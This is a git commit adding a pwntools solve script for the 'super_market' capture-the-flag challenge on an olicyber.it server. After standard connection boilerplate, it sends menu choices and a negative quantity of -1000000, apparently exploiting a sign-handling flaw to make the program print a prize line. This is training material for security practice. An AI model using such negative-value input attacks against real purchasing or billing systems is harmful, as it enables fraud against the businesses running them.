fa560101ac0fea6a4fc35d956ab2069eef2874fa
Rosario <yangrosario2006@gmail.com>
2026-07-02 15:59:52 +0200

    supermarket

---
+++ 0)Completed/pwn/super_market/sol.py
@@ -0,0 +1,67 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from ctypes import CDLL
+
+context.terminal = [
+    "kitty",
+    "@",
+    "launch",
+    "--location=hsplit",
+    # "--location=vsplit",
+    "--wait-for-child-to-exit"
+]
+
+# context.log_level = 'error' # se non vuoi vedere i loggin
+exe = context.binary = ELF(args.EXE or './super_market')
+lib = CDLL(exe.libc.path)
+host = args.HOST or 'market.challs.olicyber.it'
+port = int(args.PORT or 10005)
+
+def unpack(txt):
+    return u64(txt.ljust(8, b'\x00'))
+
+def vers_libc(function):
+    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+io = start()
+
+io.sendlineafter(b"> ", b"2")
+io.sendlineafter(b"> ", str(-1000000).encode())
+io.sendlineafter(b": ", b"s")
+io.sendlineafter(b"> ", b"3")
+io.sendlineafter(b"> ", b"1")
+print(io.recvline().decode())
+
+io.close()
+
+# io.interactive()
+
